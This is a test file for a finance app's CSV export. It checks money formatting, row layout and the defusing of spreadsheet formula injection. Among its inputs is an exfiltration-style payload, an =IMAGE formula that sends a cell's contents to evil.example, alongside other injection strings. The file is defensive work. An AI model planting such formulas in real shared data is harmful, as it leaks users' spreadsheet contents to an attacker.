import { describe, expect, it } from 'vitest';
import type { EvolutionReportResponse, EvolutionRow } from '@effinance/shared';
import { csvMoney, csvText, evolutionToCsv } from './evolution-csv';

const row = (name: string, values: number[], children: EvolutionRow[] = []): EvolutionRow => ({
  categoryId: name,
  name,
  icon: 'tag',
  color: '#000000',
  values,
  total: values.reduce((a, b) => a + b, 0),
  average: Math.round(values.reduce((a, b) => a + b, 0) / values.length),
  children,
});

describe('evolution CSV', () => {
  it('formats money for pt-BR spreadsheets', () => {
    expect(csvMoney(123456)).toBe('1234,56');
    expect(csvMoney(5)).toBe('0,05');
    expect(csvMoney(-100)).toBe('-1,00');
  });

  it('quotes and defuses formulas', () => {
    expect(csvText('Mercado')).toBe('Mercado');
    expect(csvText('Casa; aluguel')).toBe('"Casa; aluguel"');
    expect(csvText('=HYPERLINK("x")')).toBe(`"'=HYPERLINK(""x"")"`);
    expect(csvText('-Taxa')).toBe("'-Taxa");
  });

  // Category names are typed by any editor of a shared workspace and end up in the owner's
  // spreadsheet: no cell may start a formula, whatever separator the spreadsheet splits on.
  it('defuses formulas hidden behind whitespace, full-width signs or line breaks', () => {
    for (const name of [' =1+1', '　=1+1', '＝1+1', '＋1', '\n=1+1', '\t=1+1', '@SUM(A1)']) {
      const cell = csvText(name).replace(/^"|"$/g, '');
      expect(cell.startsWith("'"), JSON.stringify(name)).toBe(true);
    }
    // Ordinary names keep their text.
    expect(csvText(' Mercado')).toBe(' Mercado');
    expect(csvText('Saúde & bem-estar')).toBe('Saúde & bem-estar');
  });

  it('no formula appears when the file is split on commas, tabs or line breaks (other locales)', () => {
    // Excel with a comma list separator (en-US) or a "paste as text" splits the line on `,`/tab,
    // ignoring the quotes in the middle of a field: each piece must still be inert.
    const payloads = [
      'Lazer,=IMAGE("https://evil.example/?"&A1)',
      'Casa;+1',
      'Casa\t-2+3',
      'Casa\n@SUM(A1)',
      'Casa, =HYPERLINK("x")',
    ];
    for (const name of payloads) {
      const fields = csvText(name).split(/[,;\t\r\n]/).map((f) => f.replace(/^"/, ''));
      for (const f of fields) expect(/^[\s　]*[=+\-@＝＋－＠]/.test(f), `${JSON.stringify(name)} → ${f}`).toBe(false);
    }
  });

  it('writes groups, categories, subcategories and the result', () => {
    const food = row('Alimentação', [1000, 2000], [row('Mercado', [1000, 1500]), row('Restaurantes', [0, 500])]);
    const report: EvolutionReportResponse = {
      periods: [
        { key: '2026-09', label: 'Set/26', start: '2026-09-01', end: '2026-09-30', current: false },
        { key: '2026-10', label: 'Out/26', start: '2026-10-01', end: '2026-10-31', current: true },
      ],
      activePeriods: 2,
      income: { rows: [row('Salário', [5000, 5000])], values: [5000, 5000], total: 10000, average: 5000 },
      expense: { rows: [food], values: [1000, 2000], total: 3000, average: 1500 },
      result: [4000, 3000],
    };
    const csv = evolutionToCsv(report);
    expect(csv.startsWith('﻿')).toBe(true);
    expect(csv.slice(1).trimEnd().split('\r\n')).toEqual([
      'Grupo;Categoria;Subcategoria;Set/26;Out/26;Média;Total',
      'Receitas;Total;;50,00;50,00;50,00;100,00',
      'Receitas;Salário;;50,00;50,00;50,00;100,00',
      'Despesas;Total;;10,00;20,00;15,00;30,00',
      'Despesas;Alimentação;;10,00;20,00;15,00;30,00',
      'Despesas;Alimentação;Mercado;10,00;15,00;12,50;25,00',
      'Despesas;Alimentação;Restaurantes;0,00;5,00;2,50;5,00',
      'Resultado;;;40,00;30,00;35,00;70,00',
    ]);
  });
});
